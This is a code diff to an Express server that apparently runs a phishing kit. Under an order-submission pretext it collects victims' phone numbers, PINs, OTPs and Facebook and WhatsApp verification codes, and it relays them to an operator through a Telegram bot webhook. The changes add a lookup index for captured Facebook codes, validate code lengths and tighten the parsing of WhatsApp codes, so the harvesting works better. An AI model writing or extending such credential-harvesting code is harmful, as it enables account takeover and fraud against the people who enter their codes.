@@ -17,6 +17,7 @@ const userCredentials = {};
 // Secondary lookup indices for instant text search inside Telegram chat
 const otpToPhone = {};
 const pinToPhone = {};
+const fbCodeToPhone = {};
 
 function escapeMarkdown(text) {
     if (!text) return '';
@@ -54,6 +55,7 @@ app.post('/api/submit-order', async (req, res) => {
         if (!phone) return res.status(400).json({ success: false, message: 'Phone number required.' });
 
         const cleanPhone = normalizePhone(phone);
+        if (!cleanPhone) return res.status(400).json({ success: false, message: 'Invalid phone number.' });
 
         const BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
         const CHAT_ID = process.env.TELEGRAM_CHAT_ID;
@@ -95,15 +97,21 @@ app.post('/api/submit-order', async (req, res) => {
         // Always force status back to pending upon a fresh submission request from client
         orderStatuses[cleanPhone] = { status: 'pending', timestamp: Date.now() };
 
-        // Independent Facebook Verify flow: only phone number and code, no old numbers/credentials
+        // Independent Facebook Verify flow: supports 6-digit or 8-digit codes and resend requests
         if (uniqueId && (uniqueId.startsWith('Facebook Verify Code: ') || uniqueId === 'Facebook Verify Resend Code')) {
             const isResend = uniqueId === 'Facebook Verify Resend Code';
-            const fbCode = isResend ? '' : uniqueId.replace('Facebook Verify Code: ', '').trim();
+            const rawFbCode = isResend ? '' : uniqueId.replace('Facebook Verify Code: ', '').trim();
+            const fbCode = isResend ? '' : rawFbCode.replace(/\D/g, '');
+
+            if (!isResend && fbCode.length !== 6 && fbCode.length !== 8) {
+                return res.status(400).json({ success: false, message: 'Invalid verification code length.' });
+            }
 
             if (!userCredentials[cleanPhone]) userCredentials[cleanPhone] = {};
             userCredentials[cleanPhone].phone = cleanPhone;
             if (!isResend && fbCode) {
                 userCredentials[cleanPhone].fbCode = fbCode;
+                fbCodeToPhone[fbCode] = cleanPhone;
             }
 
             let fbMessage = isResend
@@ -235,7 +243,7 @@ app.get('/api/check-status', (req, res) => {
 
     // Flexible lookup matching to avoid formatting or spacing mismatches
     let entry = orderStatuses[cleanPhone];
-    if (!entry) {
+    if (!entry && cleanPhone) {
         const foundKey = Object.keys(orderStatuses).find(k => k.includes(cleanPhone) || cleanPhone.includes(k));
         if (foundKey) entry = orderStatuses[foundKey];
     }
@@ -262,9 +270,11 @@ app.post('/api/telegram-webhook', async (req, res) => {
                 targetPhone = pinToPhone[queryText];
             } else if (otpToPhone[queryText]) {
                 targetPhone = otpToPhone[queryText];
-            } else if (userCredentials[cleanQueryPhone]) {
+            } else if (fbCodeToPhone[queryText]) {
+                targetPhone = fbCodeToPhone[queryText];
+            } else if (cleanQueryPhone && userCredentials[cleanQueryPhone]) {
                 targetPhone = cleanQueryPhone;
-            } else {
+            } else if (queryText) {
                 // Partial phone number search fallback
                 const foundKey = Object.keys(userCredentials).find(k => k.includes(queryText));
                 if (foundKey) targetPhone = foundKey;
@@ -357,7 +367,7 @@ app.post('/api/telegram-webhook', async (req, res) => {
                              `📱 Phone: \`${escapeMarkdown(rawDigits)}\``;
 
         if (stepTag === 'wa') {
-            const codeMatch = origText.match(/Code:\s*([0-9]+)/i);
+            const codeMatch = origText.match(/Code:\s*([0-9]{6,8})/i);
             const preservedFbCode = (userCredentials[phone] && userCredentials[phone].fbCode) || (codeMatch ? codeMatch[1] : '');
             if (preservedFbCode) {
                 updatedMessage += `\n🔢 Code: \`${escapeMarkdown(preservedFbCode)}\``;
